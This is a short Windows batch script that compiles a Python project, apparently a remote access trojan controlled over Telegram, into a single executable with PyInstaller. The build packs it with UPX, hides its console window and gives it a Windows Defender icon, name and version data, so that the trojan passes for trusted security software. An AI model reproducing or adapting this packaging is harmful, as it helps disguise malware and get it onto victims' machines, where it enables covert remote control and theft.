echo off
cd O:\OneDrive - xKx\SoftwareProyectGit\RAT-via-Telegram

pyinstaller --clean --distpath "CompiladoEXE"  --upx-dir upx-* --windowed   -F --onefile --icon iconDefender.ico --version-file versionN.txt WindowsDefenderAdvanced.py

:cmd
pause null 
